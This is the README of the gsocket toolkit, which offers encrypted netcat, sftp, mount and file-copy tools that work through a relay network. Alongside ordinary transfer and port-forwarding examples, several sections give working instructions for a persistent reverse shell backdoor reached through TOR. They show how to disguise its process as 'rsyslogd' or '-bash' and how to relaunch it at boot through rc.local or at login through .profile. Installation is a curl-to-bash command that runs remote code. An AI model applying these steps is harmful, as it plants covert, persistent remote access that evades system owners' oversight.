# Global Socket
**Moving data from here to there. Securely, Fast and trough NAT/Firewalls.**

[![Watch the video](https://github.com/hackerschoice/hackerschoice.github.io/blob/master/eeelite-console.png)](https://www.youtube.com/watch?v=tmf9VGDPILE)

![anim](https://github.com/hackerschoice/hackerschoice.github.io/blob/master/gsocket-anim2.gif)

Global Socket allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.

**Features:**
- Uses the Global Socket Relay Network to connect TCP pipes
- End-2-End encryption (using OpenSSL's SRP / [RFC 5054](https://tools.ietf.org/html/rfc5054))
- AES-256 & key exchange using 4096-bit Prime
- No PKI required.
- Perfect Forward Secrecy
- TOR support (optional)

Abandon the thinking that an IP Address is needed to communicate with somebody. Instead start thinking that two users should be able to communicate with each other as long as they know the same secret (key/password). The Global Socket library handles the rest: It locally derives temporary session keys and IDs and connects with the other user trough the Global Socket Relay Network (GSRN). Once found the library then negotiates a secure TLS connection between both users (End-2-End). The password/secret never leaves your workstation. **The GSRN sees only the encrypted traffic**.

The GSRN is a free cloud service and is free to use by anyone.

Includes:
* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (```gs-netcat -s MySecret -i```), spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.
* **gs-sftp** - sftp server & client between two firewalled workstations (```gs-sftp -s MySecret```)
* **gs-mount** - Access and mount a remote file system (```gs-mount -s MySecret ~/mnt/warez```)
* **blitz** - Copy data (single or recursivley) (```blitz -s MySecret /usr/share/*```)
* ...many more examples and tools.

<A></A>|<A></A>
----------|-------------
Download|[gsocket-1.4.24.tar.gz](https://github.com/hackerschoice/gsocket/releases/download/v1.4.24/gsocket-1.4.24.tar.gz) (Linux, MacOS, FreeBSD, Solaris)
Debian/Ubuntu| [gsocket_1.4.22_all.deb](https://github.com/hackerschoice/binary/raw/main/gsocket/latest/gsocket_1.4.22_all.deb)
Windows| use docker (see below)
Man Page| [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html), [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html), [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html), [blitz(1)](https://hackerschoice.github.io/blitz.1.html)
Docker|  docker run --rm -it hackerschoice/gsocket
Docker| docker run --rm -it hackerschoice/gsocket-tor # gs via TOR

Video 1: [https://www.thc.org/gsocket-anim2.gif](https://www.thc.org/gsocket-anim2.gif)
Video 2: [https://www.youtube.com/watch?v=tmf9VGDPILE](https://www.youtube.com/watch?v=tmf9VGDPILE)

**BETA BETA BETA. PRIVATE RELEASE ONLY.**
---
**TEST SERVER FOR TESTING = TRY ANY OF THESE COMMANDS**

The Test-Server is running behind NAT/FIREWALL. The commands below will use the GSRN to connect to the Test-Server.
```
### Access the test-server
$ gs-sftp -s thctestserver

### Mount a directory from the test-server to your local workstation
$ mkdir ~/mnt
$ gs-mount -s thctestserver ~/mnt   

### Transfer 'directory-with-stuff' to the test-server
$ blitz -s blitztestserver directory-with-stuff

### Transfer all your mp3 to the test-server
$ find . -name '*.mp3' | blitz -s blitztestserver -f -

### Get a root-shell on the test-server
$ gs-netcat -s AskUsForThePassword -i
```
Run your own server by using option *-l* and pick your own password (option *-s \<secret\>*). The server does not need to be reachable from the Internet.

---
**Installation:**
```
$ /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/hackerschoice/gsocket/master/install.sh)"
```
---
**Usage:**

1. Log in to *Workstation A* from *Workstation B* through any firewall/NAT
```
$ ./gs-netcat -l -i   # Workstation A
$ ./gs-netcat -i      # Workstation B
```
See also: [gs-netcat(1)](https://hackerschoice.github.io/gs-netcat.1.html)

2. Transfer files from *Workstation B* to *Workstation A*
```
$ blitz -l                         # Workstation A
$ blitz /usr/share/*  /etc/*       # Workstation B
```
See also: [blitz(1)](https://hackerschoice.github.io/blitz.1.html)

3. SFTP through Global Socket Relay Network
```
$ gs-sftp -l                  # Workstation A
$ gs-sftp                     # Workstation B
```
See also: [gs-sftp(1)](https://hackerschoice.github.io/gs-sftp.1.html)

4. Mount *Workstation A's* directory from  *Workstation B*
```
$ gs-mount -l                # Workstation A
$ gs-mount ~/mnt             # Workstation B
```
See also: [gs-mount(1)](https://hackerschoice.github.io/gs-mount.1.html)

5. Pipe data from Workstation B to Workstation A
```
$ gs-netcat -l -r >warez.tar.gz    # Workstation A
$ gs-netcat <warez.tar.gz          # Workstation B
```

6. Port forward. *Workstation B's* Port 2222 is forwarded to 192.168.6.7 on *Workstation A's* private LAN
```
$ gs-netcat -l -d 192.168.6.7 -p 22 # Workstation A
$ gs-netcat -p 2222                 # Workstation B
$ ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Host's private LAN
...or...
$ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22                   # Workstation A
$ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter  # Workstation B
```

7. Execute any command (nc -e style) on *Workstation A*
```
$ gs-netcat -l -e "echo hello world; id; exit"   # Workstation A
$ gs-netcat                                      # Workstation B
```

8. Quick Secure Chat with a friend
```
$ gs-full-pipe -s MySecret -A               # You
$ gs-full-pipe -s MySecret -A               # Them
```

9. Access entirety of *Workstation A's* private LAN (Sock4/4a/5 proxy)
```
$ gs-netcat -l -S          # Workstation A
$ gs-netcat -p 1080        # Workstation B

Access www.google.com via Workstation A's private LAN from your Workstation B:
$ curl --socks4a 127.1:1080 http://www.google.com 

Access fileserver.local:22 on Workstation A's private LAN from your Workstation B:
$ socat -  "SOCKS4a:127.1:fileserver.local:22"
```

10. Persistant, daemonized and auto-respawn/watchdog reverse PTY backdoor via TOR
```
$ gs-netcat -l -i -D    # some firewalled server
$ gs-netcat -i -T       # You, via TOR
```

11. SoCAT 2 
```
gs-netcat can be used in a socat address-chain using the EXEC target. Happy bouncing. Enjoy. :> 
```
---
**Pro-Tips:**

1. Force TOR or fail:
Add -T to relay your traffic through TOR or use these environment variable to force TOR or fail gracefully if TOR is not running:
```
$ export GSOCKET_SOCKS_IP=127.0.0.1
$ export GSOCKET_SOCKS_PORT=9050
```

2. A reverse backdoor

The backdoor supports multiple concurrent connections and spawns a real PTY/interactive-shell with ctrl-c and colors working (like OpenSSH does).
```
$ gs-netcat -k keyfile.txt -l -i    # Host
$ gs-netcat -k keyfile.txt -T -i    # Workstation (via Tor & Global Socket Relay)
```

Add -D on the host side to run gs-netcat as a daemon and in watchdog-mode: The backdoor will automatically restart if it is ever killed.

3. Use -k

Using -s is not secure. Add your *secret* to a file and use -k &lt;filen&gt; or use GSOCKET_ARGS or enter the password when prompted.

```
$ gs-netcat -k MyFile.txt

$ export GSOCKET_ARGS="-s MySecret"
$ gs-netcat -l
```

Use this command to generate a new secure password at random:
```
$ gs-netcat -g
```

4. Hide your arguments (argv)

Pass the arguments by environment variable (GSOCKET_ARGS) and use a bash-trick to hide gs-netcat binary in the process list:
```
$ export GSOCKET_ARGS="-s MySecret -li -q -D"
$ exec -a -bash ./gs-netcat &     # Hide as '-bash'.
$ ps alxww | grep gs-netcat

$ ps alxww | grep -bash
  1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
```

5. Start backdoor after reboot

Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
```
$ cat /etc/rc.local
#! /bin/sh -e

GSOCKET_ARGS="-s MySecret -liqD" HOME=/root TERM=xterm-256color SHELL="/bin/bash" /bin/bash -c "cd $HOME; exec -a rsyslogd /usr/local/bin/gs-netcat"

exit 0
```
During bootup the environment variables are not all set. Thus we set some values to make the backdoor more enjoyable (optionally): *TERM=xterm-256color* and *SHELL=/binb/bash* and *HOME=/root*. Next the startup script (*/etc/rc.local*) uses */bin/sh* which does not support our *exec -a* trick. Thus we use */bin/sh* to start */bin/bash* which in turn does the *exec -a* trick and starts *gs-netcat*. Puh. The gs-netcat process is hidden (as *rsyslogd*) from the process list.Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.

Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
```
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret2 -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
```

Starting a port-forward during bootup. This one forwards TCP to 127.0.0.1:22 (example):
```
GSOCKET_ARGS="-k MySecret3 -lqD -d 127.1 -p22"  /bin/bash -c "exec -a rsyslogp /usr/local/bin/gs-netcat"
```

---
**Crypto / Security Mumble Jumble**
1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
2. The session key is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password).
3. The password can be 'weak' without weakening the security of the session. A brute force attack against a weak password requires a new TCP connection for every guess.
4. Do not use stupid passwords like 'password123'. Malice might pick the same (stupid) password by chance and connect. If in doubt use *gs-netcat -g* to generate a strong one. Alice's and Bob's password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect.
5. If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected.
6. Assume Alice shares the same password with Bob and Malice. When Alice stops listening for a connection then Malice could start to listen for the connection instead. Bob (when opening a new connection) can not tell if he is connecting to Alice or to Malice. Use -a &lt;token&gt; if you worry about this. TL;DR: When sharing the same password with a group larger than 2 then it is assumed that everyone in that group plays nicely. Otherwise use SSH over the GS/TLS connection.
7. SRP has Perfect Forward Secrecy. This means that past sessions can not be decrypted even if the password becomes known.
8. It is possible (by using traffic analytics) to determine that Alice is communicating with Bob. The content of such communcitation is however secret (private)  and can not be revealed by an ISP or the GSRN backend. The gsocket tools (such as gs-netcat) support the -T flag to anonymize the traffic via TOR.
9. I did not invent SRP. It's part of OpenSSL :>
---

             If netcat is a swiss army knife then gs-netcat is a germanic battle axe... 
                                                                    --acpizer/UnitedCrackingForce

Join us 

Telegram: https://t.me/thcorg 

Twitter: https://twitter.com/hackerschoice

shoutz: D1G, xaitax, #!adm
